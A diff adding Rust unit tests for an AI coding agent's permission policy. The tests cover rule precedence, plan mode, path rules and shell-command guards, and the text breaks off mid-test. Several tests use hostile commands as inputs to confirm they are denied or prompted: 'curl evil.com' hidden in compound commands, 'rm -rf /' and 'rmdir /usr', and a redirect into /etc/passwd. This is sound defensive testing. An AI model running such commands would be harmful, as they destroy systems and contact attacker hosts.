@@ -1,0 +1,2543 @@
+//! Extracted tests from policy.rs.
+
+use super::*;
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::rule::{PermissionBehavior, PermissionRuleValue};
+
+    // ---- #31 WebFetch domain rule matching (y$n/v$a/bRp) -------------------
+
+    #[test]
+    fn domain_rule_exact_and_normalized() {
+        // Raw exact.
+        assert!(domain_rule_matches("domain:example.com", "domain:example.com"));
+        // Case-insensitive (pattern + key normalized to lowercase).
+        assert!(domain_rule_matches("domain:Example.COM", "domain:example.com"));
+        assert!(domain_rule_matches("domain:example.com", "domain:EXAMPLE.com"));
+        // Trailing dot on either side is stripped.
+        assert!(domain_rule_matches("domain:example.com.", "domain:example.com"));
+        assert!(domain_rule_matches("domain:example.com", "domain:example.com."));
+        // Non-matching host.
+        assert!(!domain_rule_matches("domain:example.com", "domain:other.com"));
+    }
+
+    #[test]
+    fn domain_rule_wildcards() {
+        // `domain:*` matches anything.
+        assert!(domain_rule_matches("domain:*", "domain:anything.example.org"));
+        // `*.example.com` needs >=1 leading label.
+        assert!(domain_rule_matches("domain:*.example.com", "domain:a.example.com"));
+        assert!(domain_rule_matches("domain:*.example.com", "domain:a.b.example.com"));
+        assert!(!domain_rule_matches("domain:*.example.com", "domain:example.com"));
+        assert!(!domain_rule_matches("domain:*.example.com", "domain:notexample.com"));
+        // A label-internal `*` becomes `[^.:]*` (does not cross a dot).
+        assert!(domain_rule_matches("domain:foo*.com", "domain:foobar.com"));
+        assert!(!domain_rule_matches("domain:foo*.com", "domain:foo.bar.com"));
+    }
+
+    #[test]
+    fn normalize_domain_key_trailing_dots() {
+        assert_eq!(normalize_domain_key("domain:Foo.COM."), "domain:foo.com");
+        // Preceded by `*`/`.` → not stripped (lookbehind fails).
+        assert_eq!(normalize_domain_key("domain:*."), "domain:*.");
+        // Trailing dots preserved before a :port-less host only; with port the
+        // host body is trimmed.
+        assert_eq!(normalize_domain_key("domain:x.com.:8080"), "domain:x.com:8080");
+        // Non-domain string untouched.
+        assert_eq!(normalize_domain_key("general-purpose"), "general-purpose");
+    }
+
+    #[test]
+    fn default_mode_asks_for_unknown_tool() {
+        let p = PermissionPolicy::new(PermissionMode::Default);
+        let r = p.authorize("Bash", &serde_json::json!({}));
+        assert!(matches!(r, PermissionResult::Ask { .. }));
+    }
+
+    #[test]
+    fn deny_rule_wins_over_allow() {
+        let mut p = PermissionPolicy::new(PermissionMode::Default);
+        p.allow_rules
+            .entry(PermissionRuleSource::UserSettings)
+            .or_default()
+            .push(PermissionRule {
+                value: PermissionRuleValue {
+                    tool_name: "Bash".into(),
+                    rule_content: None,
+                },
+                behavior: PermissionBehavior::Allow,
+                source: PermissionRuleSource::UserSettings,
+            });
+        p.deny_rules
+            .entry(PermissionRuleSource::ProjectSettings)
+            .or_default()
+            .push(PermissionRule {
+                value: PermissionRuleValue {
+                    tool_name: "Bash".into(),
+                    rule_content: None,
+                },
+                behavior: PermissionBehavior::Deny,
+                source: PermissionRuleSource::ProjectSettings,
+            });
+        let r = p.authorize("Bash", &serde_json::json!({}));
+        assert!(matches!(r, PermissionResult::Deny { .. }));
+    }
+
+    #[test]
+    fn tool_wide_deny_names_collects_only_content_less_deny_rules() {
+        // FIX 1: `tool_wide_deny_names` returns the names of TOOL-WIDE deny rules
+        // (rule_content == None) and EXCLUDES content deny rules (which deny calls,
+        // not the tool) — feeding claude-code `filterToolsByDenyRules`.
+        let rules = [
+            // tool-wide deny → included
+            PermissionRule {
+                value: PermissionRuleValue {
+                    tool_name: "WebFetch".into(),
+                    rule_content: None,
+                },
+                behavior: PermissionBehavior::Deny,
+                source: PermissionRuleSource::ProjectSettings,
+            },
+            // MCP server-prefix tool-wide deny → included
+            PermissionRule {
+                value: PermissionRuleValue {
+                    tool_name: "mcp__github".into(),
+                    rule_content: None,
+                },
+                behavior: PermissionBehavior::Deny,
+                source: PermissionRuleSource::UserSettings,
+            },
+            // CONTENT deny → EXCLUDED (denies the call, not the tool)
+            PermissionRule {
+                value: PermissionRuleValue {
+                    tool_name: "Bash".into(),
+                    rule_content: Some("rm:*".into()),
+                },
+                behavior: PermissionBehavior::Deny,
+                source: PermissionRuleSource::ProjectSettings,
+            },
+            // allow rule of any kind → never in the deny list
+            allow_rule("Read", None),
+        ];
+        let p = PermissionPolicy::from_rules(PermissionMode::Default, rules);
+        let mut names = p.tool_wide_deny_names();
+        names.sort();
+        assert_eq!(
+            names,
+            vec!["WebFetch".to_string(), "mcp__github".to_string()]
+                .into_iter()
+                .collect::<std::collections::BTreeSet<_>>()
+                .into_iter()
+                .collect::<Vec<_>>(),
+            "only the two tool-wide deny names (sorted), Bash(rm:*) content rule excluded"
+        );
+    }
+
+    #[test]
+    fn tool_wide_deny_names_empty_with_no_deny_rules() {
+        let p = PermissionPolicy::new(PermissionMode::Default);
+        assert!(p.tool_wide_deny_names().is_empty());
+    }
+
+    #[test]
+    fn dontask_denies_unmatched() {
+        let p = PermissionPolicy::new(PermissionMode::DontAsk);
+        assert!(matches!(
+            p.authorize("Bash", &serde_json::json!({})),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn bypass_allows_unmatched() {
+        let p = PermissionPolicy::new(PermissionMode::BypassPermissions);
+        assert!(matches!(
+            p.authorize("Bash", &serde_json::json!({})),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── Plan-mode dynamic gate: authorize_with_mode ──────────────────────────
+
+    #[test]
+    fn authorize_with_mode_self_mode_matches_authorize() {
+        // authorize() is exactly authorize_with_mode(.., self.mode): threading the
+        // boot mode through the refactor must not change any decision (identity).
+        for mode in [
+            PermissionMode::Default,
+            PermissionMode::AcceptEdits,
+            PermissionMode::DontAsk,
+            PermissionMode::BypassPermissions,
+            PermissionMode::Plan,
+        ] {
+            let p = PermissionPolicy::new(mode);
+            for tool in ["Bash", "Read", "Edit", "WebFetch"] {
+                let input = serde_json::json!({});
+                // PermissionResult is not PartialEq; the variant discriminant is
+                // enough here (authorize literally delegates to
+                // authorize_with_mode(self.mode), so the decision class must match).
+                assert_eq!(
+                    std::mem::discriminant(&p.authorize(tool, &input)),
+                    std::mem::discriminant(&p.authorize_with_mode(tool, &input, mode)),
+                    "identity must hold for {tool} in {mode:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn plan_mode_overrides_accept_edits_auto_allow() {
+        // THE security property of the dynamic gate: a session booted in
+        // AcceptEdits auto-allows an in-workdir Edit, but once EnterPlanMode has
+        // fired the gate authorizes under Plan — and Plan's mutation backstop must
+        // OVERRIDE the AcceptEdits auto-allow (entering plan mode cannot leak the
+        // boot mode's edit auto-allow). Proven via authorize_with_mode(Plan).
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::AcceptEdits);
+        // Boot mode (AcceptEdits): an in-workdir edit auto-allows.
+        assert!(
+            matches!(
+                p.authorize("Edit", &edit("/proj/src/main.rs")),
+                PermissionResult::Allow { .. }
+            ),
+            "AcceptEdits boot mode auto-allows an in-workdir edit"
+        );
+        // Under Plan: the backstop fires → Ask (NOT auto-allowed).
+        assert!(
+            matches!(
+                p.authorize_with_mode("Edit", &edit("/proj/src/main.rs"), PermissionMode::Plan),
+                PermissionResult::Ask { .. }
+            ),
+            "plan mode overrides the AcceptEdits auto-allow with the mutation backstop"
+        );
+    }
+
+    #[test]
+    fn plan_mode_keeps_deny_and_allow_rules() {
+        // Plan mode is applied AFTER the rule walks, so explicit rules still bind:
+        // a deny rule denies and an allow rule wins (no backstop) even under Plan.
+        let denied = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Edit"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(
+            matches!(
+                denied.authorize_with_mode("Edit", &edit("/proj/src/x.rs"), PermissionMode::Plan),
+                PermissionResult::Deny { .. }
+            ),
+            "a deny rule still binds under plan mode"
+        );
+        let allowed = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Edit(src/**)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(
+            matches!(
+                allowed.authorize_with_mode("Edit", &edit("/proj/src/x.rs"), PermissionMode::Plan),
+                PermissionResult::Allow { .. }
+            ),
+            "an explicit allow rule wins over the plan backstop"
+        );
+    }
+
+    #[test]
+    fn plan_mode_does_not_backstop_plan_safe_read() {
+        // A plan-safe read-only tool is NOT caught by the mutation backstop; it
+        // falls to the mode-fallback ask (which the gate auto-allows as read-only).
+        // It must NOT be denied.
+        let p = PermissionPolicy::new(PermissionMode::Default);
+        assert!(
+            matches!(
+                p.authorize_with_mode("Read", &serde_json::json!({}), PermissionMode::Plan),
+                PermissionResult::Ask { .. }
+            ),
+            "plan-safe Read falls through the backstop to an (auto-allowable) ask"
+        );
+    }
+
+    #[test]
+    fn from_rules_buckets_by_behavior_and_authorizes() {
+        // The loader → policy → authorize foundation: a deny rule lands in the
+        // deny bucket and wins; an allow rule lands in the allow bucket.
+        let rules = crate::loader::permission_rules_from_settings_json(
+            r#"{ "permissions": { "allow": ["Read"], "deny": ["Bash"], "ask": ["WebFetch"] } }"#,
+            PermissionRuleSource::UserSettings,
+        )
+        .unwrap();
+        let p = PermissionPolicy::from_rules(PermissionMode::Default, rules);
+        assert_eq!(p.allow_rules.values().flatten().count(), 1);
+        assert_eq!(p.deny_rules.values().flatten().count(), 1);
+        assert_eq!(p.ask_rules.values().flatten().count(), 1);
+        // Bash is denied by rule (tool-wide), Read allowed, WebFetch falls to
+        // its ask rule, an unmatched tool falls to the Default-mode ask.
+        assert!(matches!(
+            p.authorize("Bash", &serde_json::json!({})),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Read", &serde_json::json!({})),
+            PermissionResult::Allow { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Other", &serde_json::json!({})),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    // ── phase 3a: file-path content matching ──────────────────────────────
+
+    use crate::filesystem::FsRoots;
+    use std::path::PathBuf;
+
+    fn roots() -> FsRoots {
+        FsRoots {
+            cwd: PathBuf::from("/proj"),
+            home: Some(PathBuf::from("/home/u")),
+            lingxi_home: PathBuf::from("/home/u/.lingxi"),
+        }
+    }
+
+    fn policy_with_roots(raw: &str, mode: PermissionMode) -> PermissionPolicy {
+        let rules = crate::loader::permission_rules_from_settings_json(
+            raw,
+            PermissionRuleSource::ProjectSettings,
+        )
+        .unwrap();
+        PermissionPolicy::from_rules(mode, rules).with_roots(roots())
+    }
+
+    fn edit(path: &str) -> serde_json::Value {
+        serde_json::json!({ "file_path": path })
+    }
+
+    #[test]
+    fn content_allow_rule_matches_only_matching_path() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Edit(src/**)"] } }"#,
+            PermissionMode::Default,
+        );
+        // Edit inside src → allowed by rule.
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/main.rs")),
+            PermissionResult::Allow { .. }
+        ));
+        // Edit outside src → no rule match → falls to Default-mode ask.
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/tests/x.rs")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn content_deny_rule_denies_only_matching_path() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Read(./secrets/**)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Read", &edit("/proj/secrets/key.pem")),
+            PermissionResult::Deny { .. }
+        ));
+        // A read elsewhere is NOT denied (precise, unlike phase-2 tool-wide).
+        assert!(matches!(
+            p.authorize("Read", &edit("/proj/src/main.rs")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn edit_rule_groups_to_all_editors() {
+        // An `Edit(...)` deny rule must apply to Write / NotebookEdit too.
+        // (cwd-relative pattern so the test isolates grouping, not root
+        // resolution — `/etc/**` would anchor to the project root, not `/etc`.)
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Edit(build/**)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Write", &edit("/proj/build/out.o")),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("NotebookEdit", &serde_json::json!({ "notebook_path": "/proj/build/x.ipynb" })),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn edit_allow_implies_read_allow() {
+        // An `Edit(src/**)` ALLOW rule also permits reading src/**.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Edit(src/**)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Read", &edit("/proj/src/main.rs")),
+            PermissionResult::Allow { .. }
+        ));
+        // Grep (a reader, search root inside src) is likewise allowed.
+        assert!(matches!(
+            p.authorize("Grep", &serde_json::json!({ "path": "/proj/src" })),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn edit_deny_does_not_block_reads() {
+        // claude-code `checkRead` only consults READ deny rules — an edit-deny
+        // never blocks a read.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Edit(src/**)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Read", &edit("/proj/src/main.rs")),
+            PermissionResult::Ask { .. }
+        ));
+        // …but it DOES block the editing tools.
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/main.rs")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn deny_beats_allow_at_path_level() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Edit(src/**)"], "deny": ["Edit(src/secret.rs)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/secret.rs")),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/ok.rs")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn without_roots_content_rule_matches_tool_wide_phase2() {
+        // No roots → phase-2 behavior: a content rule matches the tool name
+        // regardless of path (content ignored).
+        let rules = crate::loader::permission_rules_from_settings_json(
+            r#"{ "permissions": { "allow": ["Edit(src/**)"] } }"#,
+            PermissionRuleSource::ProjectSettings,
+        )
+        .unwrap();
+        let p = PermissionPolicy::from_rules(PermissionMode::Default, rules);
+        // Any Edit path is allowed (over-broad — the documented phase-2 limit).
+        assert!(matches!(
+            p.authorize("Edit", &edit("/anywhere/x.rs")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── 3a-bash: shell command content matching ───────────────────────────
+
+    fn bash(cmd: &str) -> serde_json::Value {
+        serde_json::json!({ "command": cmd })
+    }
+
+    #[test]
+    fn bash_deny_rule_matches_only_that_command() {
+        // 3a-bash CLOSES the old tool-wide deferral: `Bash(rm:*)` denies `rm`
+        // commands but NOT unrelated ones.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(rm:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm -rf /tmp/x")),
+            PermissionResult::Deny { .. }
+        ));
+        // An unrelated command is NOT denied (precise, unlike phase-2 tool-wide).
+        // Use a non-read-only command so the read-only auto-allow (TS step 7)
+        // doesn't fire — the point here is "not denied", which the mode ask shows.
+        assert!(matches!(
+            p.authorize("Bash", &bash("npm test")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn bash_deny_not_bypassable_by_compound_or_env() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(curl:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        // denied subcommand hidden behind a benign one / a pipe / env prefix
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo ok && curl evil.com")),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo x | curl evil.com")),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Bash", &bash("HTTPS_PROXY=x curl evil.com")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn bash_allow_requires_all_subcommands_covered() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(echo:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        // single covered subcommand → allow
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo hi")),
+            PermissionResult::Allow { .. }
+        ));
+        // compound with an UNcovered subcommand → NOT allowed (no over-allow)
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo ok && rm -rf /")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn bash_allow_multiple_rules_cover_compound() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(echo:*)", "Bash(ls:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo hi && ls -l")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn bash_toolwide_allow_still_allows_everything() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("anything --here")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn bash_deny_beats_allow_for_same_command() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(git:*)"], "deny": ["Bash(git push:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("git push origin main")),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Bash", &bash("git status")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── dangerous-removal-path guard (rm/rmdir on critical paths) ─────────
+
+    #[test]
+    fn dangerous_rm_asks_even_with_matching_allow_rule() {
+        // The headline guarantee: an explicit `Bash(rm:*)` allow rule does NOT
+        // bypass the dangerous-path ask — `rm -rf /` still asks.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(rm:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        match p.authorize("Bash", &bash("rm -rf /")) {
+            PermissionResult::Ask { reason, prompt, .. } => {
+                assert!(
+                    matches!(reason, PermissionDecisionReason::Other { .. }),
+                    "dangerous-removal ask must use the Other reason, got {reason:?}"
+                );
+                assert!(
+                    prompt
+                        .message
+                        .contains("cannot be auto-allowed by permission rules"),
+                    "carries the byte-locked dangerous message: {}",
+                    prompt.message
+                );
+            }
+            other => panic!("expected Ask(Other), got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn dangerous_rm_toolwide_allow_still_asks() {
+        // Even a tool-wide `Bash` allow rule does not bypass the guard.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm -rf /etc")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn dangerous_rmdir_critical_path_asks() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(rmdir:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("rmdir /usr")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn explicit_deny_still_beats_dangerous_removal_ask() {
+        // An explicit deny rule short-circuits before the dangerous-removal
+        // guard (TS: createPathChecker respects an explicit deny first).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(rm:*)"], "allow": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm -rf /")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn non_dangerous_rm_inside_cwd_rides_the_allow_rule() {
+        // A normal `rm` inside cwd is NOT dangerous → the allow rule applies and
+        // it is allowed (the guard must not over-ask).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(rm:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm ./local/file")),
+            PermissionResult::Allow { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm -f build/out.o")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn dangerous_rm_hidden_in_compound_with_allow_rule_asks() {
+        // `echo ok && rm -rf /` with allow rules covering both — the dangerous
+        // rm still trips the guard ahead of the allow grant.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(echo:*)", "Bash(rm:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo ok && rm -rf /")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn dangerous_removal_skipped_without_roots() {
+        // Without roots the guard cannot resolve cwd/home, so it is skipped and
+        // the allow rule applies (preserves pre-guard behavior).
+        let rules = crate::loader::permission_rules_from_settings_json(
+            r#"{ "permissions": { "allow": ["Bash"] } }"#,
+            PermissionRuleSource::ProjectSettings,
+        )
+        .unwrap();
+        let p = PermissionPolicy::from_rules(PermissionMode::Default, rules);
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm -rf /")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── bash path-constraint guard (checkPathConstraints) ──────────────────
+
+    #[test]
+    fn redirect_outside_cwd_asks_over_allow_rule() {
+        // `echo x > /etc/foo` writes outside cwd → ask even though `Bash(echo:*)`
+        // would otherwise allow it (TS checkPathConstraints `behavior: 'ask'`).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(echo:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo x > /etc/foo")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn redirect_inside_cwd_rides_the_allow_rule() {
+        // `echo x > ./local` stays inside cwd → the constraint guard does NOT
+        // trip and the allow rule applies.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(echo:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo x > ./local")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn cd_outside_cwd_asks_over_allow_rule() {
+        // `cd /tmp && ...` changes directory outside cwd → ask.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("cd /tmp && ls")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn process_substitution_asks_over_allow_rule() {
+        // Process substitution can run arbitrary commands → always ask.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo secret > >(tee /etc/passwd)")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn command_fully_inside_cwd_rides_the_allow_rule() {
+        // A command that only touches cwd-relative paths is allowed by the rule;
+        // the path-constraint guard must not over-ask.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo x > out.txt && cat out.txt")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn explicit_deny_still_beats_path_constraint_ask() {
+        // An explicit deny rule short-circuits before the path-constraint guard
+        // (the deny walk runs first), so a denied redirect is denied, not asked.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(echo:*)"], "allow": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo x > /etc/foo")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn path_constraint_skipped_without_roots() {
+        // Without roots the guard cannot resolve cwd, so it is skipped and the
+        // allow rule applies (preserves pre-guard behavior).
+        let rules = crate::loader::permission_rules_from_settings_json(
+            r#"{ "permissions": { "allow": ["Bash"] } }"#,
+            PermissionRuleSource::ProjectSettings,
+        )
+        .unwrap();
+        let p = PermissionPolicy::from_rules(PermissionMode::Default, rules);
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo x > /etc/foo")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── ask-rule consultation (was a pre-existing gap across ALL tools) ────
+
+    #[test]
+    fn ask_rule_now_consulted_for_tool() {
+        // A tool-wide ask rule yields Ask (previously fell through to mode).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["WebFetch"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("WebFetch", &serde_json::json!({ "url": "https://x" })),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn ask_rule_consulted_for_bash_command() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["Bash(npm publish:*)"], "allow": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        // ask beats the tool-wide allow (ask walked before allow)
+        assert!(matches!(
+            p.authorize("Bash", &bash("npm publish --tag beta")),
+            PermissionResult::Ask { .. }
+        ));
+        // a non-publish command still rides the tool-wide allow
+        assert!(matches!(
+            p.authorize("Bash", &bash("npm test")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn content_deny_beats_toolwide_ask() {
+        // claude-code `mSm` precedence: the ENTIRE deny phase (tool-wide + content)
+        // runs BEFORE any ask, so a CONTENT deny rule pre-empts a TOOL-WIDE ask
+        // rule — a `deny` can never be downgraded to an `ask`.
+        // `ask:["Bash"]` + `deny:["Bash(rm:*)"]`, command `rm -rf /` → DENY
+        // (mSm step 2 `K5t(...,"deny")` precedes step 3 tool-wide ask `EIo`).
+        // (Was previously the WRONG `toolwide_ask_short_circuits_before_content_deny`
+        // test that asserted Ask — the deny-first reorder corrects it to Deny.)
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["Bash"], "deny": ["Bash(rm:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm -rf /")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn toolwide_deny_still_beats_toolwide_ask() {
+        // 1a before 1b: a tool-wide deny wins over a tool-wide ask.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash"], "ask": ["Bash"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("ls")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn content_deny_beats_content_ask() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(rm:*)"], "ask": ["Bash(rm:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm x")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn deny_phase_completes_before_any_ask() {
+        // Reinforces the mSm invariant from a non-Bash angle: a CONTENT deny rule
+        // beats a TOOL-WIDE ask rule regardless of which is a guarded tool. The
+        // whole deny phase precedes the ask phase, so this returns Deny, not Ask.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["WebFetch"], "deny": ["WebFetch(domain:evil.com)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("WebFetch", &serde_json::json!({ "url": "https://evil.com/x" })),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn content_ask_beats_checkpermissions_allow_verdicts() {
+        // mSm: content ask (step 5) precedes the checkPermissions allow/ask
+        // verdicts (steps 6/7) — only a checkPermissions `deny` short-circuits
+        // before it. So a content ask wins over a read-only auto-allow: a
+        // `Bash(grep:*)` ask rule still prompts even though `grep` is read-only
+        // (which would otherwise auto-allow). (The sandbox-auto-allow sibling case
+        // is locked by `sandbox_auto_allow_ask_rule_still_asks`.)
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["Bash(grep:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("grep pat file")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn ask_rule_reason_is_matched_rule() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["WebFetch"] } }"#,
+            PermissionMode::Default,
+        );
+        match p.authorize("WebFetch", &serde_json::json!({})) {
+            PermissionResult::Ask { reason, .. } => assert!(matches!(
+                reason,
+                PermissionDecisionReason::MatchedRule { .. }
+            )),
+            other => panic!("expected Ask, got {other:?}"),
+        }
+    }
+
+    // ── Batch 3: Plan-mode mutation backstop ──────────────────────────────
+
+    #[test]
+    fn plan_mode_asks_on_mutating_tool() {
+        // Plan + Edit → Ask tagged with Plan mode (NOT deny), even with no rules.
+        let p = PermissionPolicy::new(PermissionMode::Plan);
+        match p.authorize("Edit", &edit("/proj/src/x.rs")) {
+            PermissionResult::Ask { reason, prompt, .. } => {
+                assert!(
+                    matches!(
+                        reason,
+                        PermissionDecisionReason::PermissionMode {
+                            mode: PermissionMode::Plan
+                        }
+                    ),
+                    "Plan-mutation ask must be tagged with Plan mode"
